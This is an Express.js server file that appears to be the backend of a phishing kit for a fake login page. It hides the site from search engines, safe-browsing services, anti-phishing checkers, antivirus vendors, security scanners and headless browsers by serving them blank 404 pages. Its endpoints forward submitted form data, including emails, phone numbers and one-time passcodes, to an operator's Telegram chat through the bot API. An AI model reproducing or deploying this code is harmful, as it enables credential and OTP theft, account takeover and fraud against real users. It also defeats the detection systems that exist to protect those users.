import express from 'express';
import { fileURLToPath } from 'url';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;

// The expected login subdomain hostname (e.g. "login.mydomain.com").
// Set the LOGIN_HOST environment variable in Railway to enforce subdomain-only access.
// When LOGIN_HOST is not set the check is skipped (useful for local dev / Railway preview URLs).
const LOGIN_HOST = (process.env.LOGIN_HOST || '').toLowerCase().trim();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Completely blank 404 page served to requests on wrong domains
const BLANK_404_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="referrer" content="no-referrer">
<title>404</title>
<style>body{margin:0;padding:0;background:#fff}</style>
</head>
<body></body>
</html>`;

// Domain lock: only serve content from the configured login subdomain.
// Any request arriving on a different host (e.g. the bare root domain) gets a blank 404.
app.use((req, res, next) => {
  if (!LOGIN_HOST) return next(); // not configured – allow all hosts
  const host = (req.headers.host || '').toLowerCase().split(':')[0]; // strip optional port
  if (host !== LOGIN_HOST) {
    return res.status(404).type('html').send(BLANK_404_HTML);
  }
  next();
});

// Known bot/crawler/scanner user-agent patterns (module-level for performance)
const BLOCKED_BOTS = [
  // Search engine crawlers
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
  'google-inspectiontool', 'googleother', 'google-read-aloud',
  'storebot-google', 'googleproducer',
  // SEO / marketing bots
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
  'bytespider', 'rogerbot', 'screaming frog', 'seokicks',
  'sistrix', 'blexbot', 'linkdexbot', 'megaindex',
  'serpstatbot', 'serendeputybot', 'dataforseo', 'keys-so-bot',
  // AI bots
  'gptbot', 'chatgpt-user', 'ccbot', 'claudebot',
  'anthropic-ai', 'cohere-ai', 'google-extended',
  'perplexitybot', 'youbot', 'meta-externalagent',
  'amazonbot', 'applebot', 'diffbot', 'omgili',
  'facebook', 'facebookexternalhit',
  'meta-externalfetcher', 'bytedance', 'iaskspider',
  'ai2bot', 'friendlycrawler', 'timpibot', 'velenpublicweb',
  'webzio-extended', 'img2dataset', 'omgilibot',
  // Generic bot patterns
  'crawler', 'spider', 'scraper', 'bot/', 'bot;',
  'fetch/', 'scan', 'check', 'monitor', 'probe',
  // Headless browsers
  'headlesschrome', 'phantomjs', 'slimerjs', 'casperjs',
  'puppeteer', 'playwright', 'selenium', 'webdriver',
  'chromedriver', 'geckodriver', 'electronjs',
  // Security scanners / safe browsing
  'urlscan', 'virustotal', 'phishtank', 'safebrowsing',
  'google-safety', 'google-safebrowsing',
  'netcraft', 'sucuri', 'siteguard', 'securitytrails',
  'censys', 'shodan', 'zoomeye', 'nuclei', 'nikto',
  'nessus', 'openvas', 'qualys', 'acunetix', 'netsparker',
  'burpsuite', 'zap/', 'wapiti', 'skipfish', 'w3af',
  'detectify', 'probely', 'intruder', 'pentest-tools',
  'sitecheck', 'ssllabs', 'securityheaders',
  'smartscreen', 'phishing', 'antivirus', 'antiphishing',
  'malware', 'sandbox', 'clamav', 'sophos',
  'kaspersky', 'norton', 'mcafee', 'avast', 'avg',
  'bitdefender', 'eset', 'fortinet', 'paloalto',
  'forcepoint', 'barracuda', 'proofpoint', 'mimecast',
  'checkphish', 'isitphishing', 'phishcheck', 'cyren',
  'trustwave', 'rapid7', 'tenable', 'immuniweb', 'quttera',
  'haveibeenpwned', 'cybersource', 'riskiq',
  // Scanning / fuzzing tools
  'dirbuster', 'gobuster', 'ffuf', 'feroxbuster',
  'masscan', 'nmap', 'zgrab', 'httpx', 'subfinder',
  'amass', 'knockpy', 'theHarvester',
  'wpscan', 'joomscan', 'droopescan',
  // HTTP libraries / automation
  'wget', 'httrack', 'curl/', 'python-requests', 'python-urllib',
  'go-http-client', 'java/', 'libwww-perl', 'httpie',
  'axios/', 'node-fetch', 'undici', 'http.rb',
  'ruby', 'okhttp', 'apache-httpclient',
  'aiohttp', 'reqwest', 'scrapy', 'mechanize',
  'lwp-trivial', 'pycurl', 'http_request', 'urlgrabber',
  // Link checkers / validators
  'linkchecker', 'w3c_validator', 'w3c-checklink',
  'dead link', 'broken link', 'link checker',
  // Archive / research bots
  'archive.org_bot', 'wayback', 'commoncrawl',
  'nutch', 'heritrix',
  // Preview / embed bots
  'twitterbot', 'linkedinbot', 'slackbot', 'discordbot',
  'whatsapp', 'telegrambot', 'skypeuripreview',
  'embedly', 'quora link preview', 'outbrain',
  'redditbot', 'pinterest', 'tumblr',
  // Domain / URL analysis
  'domaintools', 'builtwith', 'wappalyzer', 'whatcms',
  'webtech', 'iplookup', 'whois',
];

// Inline 404 HTML for bot responses (avoids file system access)
const NOT_FOUND_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="referrer" content="no-referrer">
<title>404 - Page Not Found</title>
<style>
body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,sans-serif;background:#f5f5f5;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh}
.c{text-align:center;padding:40px}
h1{font-size:72px;margin:0;color:#ccc;font-weight:300}
p{font-size:18px;color:#999;margin:16px 0 0}
</style>
</head>
<body>
<div class="c">
<h1>404</h1>
<p>The page you are looking for does not exist.</p>
</div>
</body>
</html>`;

// Block known bot/crawler/scanner user agents (serves 404 page to avoid revealing detection)
app.use((req, res, next) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();

  // Block requests with no user agent (automated tools)
  if (!ua) {
    return res.status(404).type('html').send(NOT_FOUND_HTML);
  }

  // Block known bot/crawler/scanner user agents
  if (BLOCKED_BOTS.some(bot => ua.includes(bot))) {
    return res.status(404).type('html').send(NOT_FOUND_HTML);
  }

  next();
});

// Block requests targeting well-known scanner/probe paths
app.use((req, res, next) => {
  const pathname = req.path.toLowerCase();
  const scannerPaths = [
    '/.env', '/.git', '/wp-login', '/wp-admin', '/xmlrpc.php',
    '/admin', '/administrator',
    '/phpmyadmin', '/config', '/.htaccess', '/debug',
    '/server-status', '/server-info', '/.svn', '/.hg',
  ];
  if (scannerPaths.some(p => pathname.startsWith(p))) {
    return res.status(404).type('html').send(NOT_FOUND_HTML);
  }
  next();
});

// Bot protection, security headers, and domain disguise
app.use((req, res, next) => {
  // Remove server identification headers
  res.removeHeader('Server');
  res.removeHeader('X-Powered-By');
  res.removeHeader('X-AspNet-Version');
  res.removeHeader('X-AspNetMvc-Version');

  // Bot protection headers
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-DNS-Prefetch-Control', 'off');
  res.setHeader('Permissions-Policy', 'interest-cohort=(), browsing-topics=(), geolocation=(), camera=(), microphone=()');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('X-Download-Options', 'noopen');
  res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});

// Serve static files from dist/
app.use(express.static(path.join(__dirname, 'dist')));

// --- API Route Handlers ---
// These replace the deleted Netlify serverless functions.
// They use the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.

// POST /.netlify/functions/sendTelegram
// Sends a message to the configured Telegram chat.
app.post('/.netlify/functions/sendTelegram', async (req, res) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID environment variables');
    return res.status(500).json({ error: 'Server configuration error: Telegram credentials not set' });
  }

  try {
    const payload = req.body;
    const text = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
    
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.substring(0, 4096), // Telegram message limit
        parse_mode: 'HTML',
      }),
    });

    const result = await telegramResponse.json();
    
    if (!telegramResponse.ok) {
      console.error('Telegram API error:', result);
      return res.status(500).json({ error: 'Failed to send Telegram message', details: result });
    }

    res.json({ success: true, message_id: result.result?.message_id });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /.netlify/functions/sendOTP
// Forwards OTP request data to Telegram (OTP is handled via admin panel).
app.post('/.netlify/functions/sendOTP', async (req, res) => {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: 'Server configuration error' });
  }

  try {
    const { email, phone, otp } = req.body;
    const text = `📱 OTP Request\nEmail: ${email || 'N/A'}\nPhone: ${phone || 'N/A'}\nOTP: ${otp || 'N/A'}\nTime: ${new Date().toISOString()}`;

    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
      }),
    });

    const result = await telegramResponse.json();
    if (!telegramResponse.ok) {
      return res.status(500).json({ error: 'Failed to send OTP notification' });
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Error in sendOTP:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /.netlify/functions/getProviderPhone
// Phone detection endpoint — returns null since real provider API integration
// requires OAuth tokens that are not available in this context.
app.post('/.netlify/functions/getProviderPhone', async (req, res) => {
  try {
    const { provider, email } = req.body;
    console.log(`Phone detection request for ${provider}: ${email}`);
    
    // Without OAuth tokens for each provider, we cannot fetch real phone numbers.
    // Return a structured response indicating manual entry is required.
    res.json({ 
      phone: null, 
      source: provider || 'unknown',
      error: 'Phone detection requires provider OAuth integration' 
    });
  } catch (error) {
    console.error('Error in getProviderPhone:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// SPA fallback — all other routes serve index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
